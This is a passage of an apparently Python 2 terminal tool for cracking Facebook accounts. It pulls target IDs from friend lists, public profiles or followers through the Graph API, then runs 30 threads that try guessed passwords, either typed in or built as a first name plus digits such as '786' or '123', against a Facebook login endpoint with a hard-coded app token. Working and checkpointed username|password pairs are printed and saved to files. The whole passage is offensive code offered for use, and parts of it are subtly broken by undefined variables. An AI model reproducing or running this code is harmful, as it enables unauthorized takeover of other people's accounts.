			b = json.loads(a.text)
			
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97mok\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/Techabm.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def duper():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo2
	os.system('clear')
	print logo
	print("\033[1;97m--------------------------------------------------")
	jalan( "\x1b[1;32;92m[1]\033[1;33;98m>\033[1;92mCrack From Friendlist With Choice Password ") 
	jalan( "\x1b[1;32;92m[2]\033[1;33;98m>\033[1;92mCrack From Any Public With Choice Password") 
	jalan( "\x1b[1;32;36m[0]\033[1;33;96m>\033[1;91mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_duper()

def pilih_duper():
	peak = raw_input("\n\033[1;31;40m> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system("clear")
		print logo
		print ("\033[1;93m For Example :\033[1;92m 786786,Pakistan, Pakistan123") 
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;96m[1]\033[1;94m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass2=raw_input("\033[1;96m[2]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass3=raw_input("\033[1;96m[3]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif peak =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;94m[ok] Enter ID/Username :\033[1;92m ")
		print("\033[1;97m--------------------------------------------------")
		time.sleep(0.05)
		print ("\033[1;93m For Example :\033[1;92m 786786,Bangladesh,Bangal123") 
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;96m[1]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass2=raw_input("\033[1;96m[2]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass3=raw_input("\033[1;96m[3]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[1;96m[>>] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("\033[1;91m[!] ID Not Found!")
			raw_input("\n\033[1;92mPress Enter To Back ")
			choice1()
		print"\033[1;35;40m[>>] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_duper()

	
	print "\033[1;36;96m[>>] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[>>] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		    print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  >-------\x1b[1;91m  To Stop Process Press CTRL+Z  \033[1;97m------>"
	print "\033[1;97m >------------------------------------------------>"
	jalan('  \033[1;93m  Plz Wait Cloned Accounts Will Appear Here')
	jalan('  \033[1;93m              Crack Bangladesh ')
        print "\033[1;97m >------------------------------------------------>"
	
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97mok\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/Techabm.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def zuper():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo2
	os.system('clear')
	print logo
	print("\033[1;97m--------------------------------------------------")
	jalan( "\x1b[1;32;92m[1]\033[1;33;98m>\033[1;96mCrack From Friendlist With Choice Password ") 
	jalan( "\x1b[1;32;92m[2]\033[1;33;98m>\033[1;96mCrack From Any Public With Choice Password") 
	jalan( "\x1b[1;32;36m[0]\033[1;33;96m>\033[1;91mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_zuper()

def pilih_zuper():
	peak = raw_input("\n\033[1;31;40m> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_zuper()
	elif peak =="1":
		os.system("clear")
		print logo
		print ("\033[1;93m For Example :\033[1;92m 786786,Pakistan, Pakistan123") 
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		time.sleep(0.05)
		pass1=raw_input("\033[1;96m[1]\033[1;94m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass2=raw_input("\033[1;96m[2]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass3=raw_input("\033[1;96m[3]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif peak =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;94m[ok] Enter ID/Username :\033[1;92m ")
		print("\033[1;97m--------------------------------------------------")
		time.sleep(0.05)
		print ("\033[1;93m For Example :\033[1;92m Sayang,Kontol,Sayang123") 
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;96m[1]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass2=raw_input("\033[1;96m[2]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass3=raw_input("\033[1;96m[3]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[1;96m[>>] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("\033[1;91m[!] ID Not Found!")
			raw_input("\n\033[1;92mPress Enter To Back ")
			choice1()
		print"\033[1;35;40m[>>] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_zuper()

	
	print "\033[1;36;96m[>>] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[>>] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		    print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  >-------\x1b[1;91m  To Stop Process Press CTRL+Z  \033[1;97m------>"
	print "\033[1;97m >------------------------------------------------>"
	jalan('  \033[1;93m  Plz Wait Cloned Accounts Will Appear Here')
	jalan('  \033[1;93m              Crack Indonesia ')
        print "\033[1;97m >------------------------------------------------>"
	
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97mok\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/Techabm.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu() 
	
def crack_follow():
	toket=open('login.txt','r').read()
	os.system('clear')
	print logo
	print 50*"\033[1;97m-"
	idt = raw_input("\033[1;97m[\033[1;95m\033[1;97m] \033[1;97mID Publik/Friends \033[1;91m:\033[1;92m ")
	print 50*"\033[1;97m-"
	time.sleep(0.05)
	print ("\033[1;93m For Example :\033[1;92m 786786,Bangladesh,Bangal123") 
	time.sleep(0.05)	
	print 50*"\033[1;97m-"	
	pass1=raw_input("\033[1;96m[1]\033[1;93mInput Password  :\033[1;94m ")	
	time.sleep(0.05)
	pass2=raw_input("\033[1;96m[2]\033[1;93mInput Password  :\033[1;94m ")	
	time.sleep(0.05)		
	pass3=raw_input("\033[1;96m[3]\033[1;93m Input Password  :\033[1;94m ")	
	time.sleep(0.05)	
	print 50*"\033[1;97m-"			
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;97m[\033[1;95m>>\033[1;97m] \033[1;97mName \033[1;91m:\033[1;92m "+op["name"]
	except KeyError:
		print"\033[1;97m[\033[1;91m!\033[1;97m] ID public/friend does not exist !"
		raw_input("\n\033[1;97mBack To Menu")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[\033[1;91m!\033[1;97m] No connection !"
		keluar()
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
	z = json.loads(r.text)
	for i in z['data']:
		id.append(i['id'])
		
	print "\033[1;93m[\033[1;92m+\033[1;97m] Total Followers \033[1;91m: \033[1;97m"+str(len(id))
	print("\033[1;94m[\033[1;92mok\033[1;97m] Cracking Process Has Been Started ...")
	print 50*"\033[1;97m-"
	
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\033[1;94m[\033[1;92mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97mok\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/Techabm.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu() 
	
def fuper():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo2
	os.system('clear')
	print logo
	print("\033[1;97m--------------------------------------------------")
	jalan( "\x1b[1;32;92m[1]\033[1;33;98m>\033[1;93mCrack From Friendlist ID ") 
	jalan( "\x1b[1;32;92m[2]\033[1;33;98m>\033[1;93mCrack From Any Public ID") 
	jalan( "\x1b[1;32;36m[0]\033[1;33;96m>\033[1;91mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_fuper()

def pilih_fuper():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_fuper()
	elif peak =="1":
		os.system('clear')
		print logo
		print("\033[1;97m--------------------------------------------------")
		jalan('\033[1;96m[+] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print("\033[1;97m--------------------------------------------------")
		idt = raw_input("\033[1;96m[ok]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[  ok] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[  ok] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			fuper()
		print"\033[1;35;37m[  ok] Getting ID"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_fuper()

	
	print "\033[1;36;96m[  ok] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[  ok] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		    print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  >-------\x1b[1;91m  To Stop Process Press CTRL+Z  \033[1;97m------>"
	print "\033[1;97m >------------------------------------------------>"
	jalan('  \033[1;93m  Plz Wait Cloned Accounts Will Appear Here')
	jalan('  \033[1;93m              Crack Pakistan ')
        print "\033[1;97m >------------------------------------------------>"
	
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass1 + '\033[1;91m>\033[1;97m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['_name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass2 + '\033[1;91m>\033[1;97m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass3 + '\033[1;91m>\033[1;97m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass4 + '\033[1;91m>\033[1;97m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass4 + '\033[1;91m>\033[1;97m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12' 
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass5 + '\033[1;91m>\033[1;97m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass5 + '\033[1;91m>\033[1;97m' + b['name']
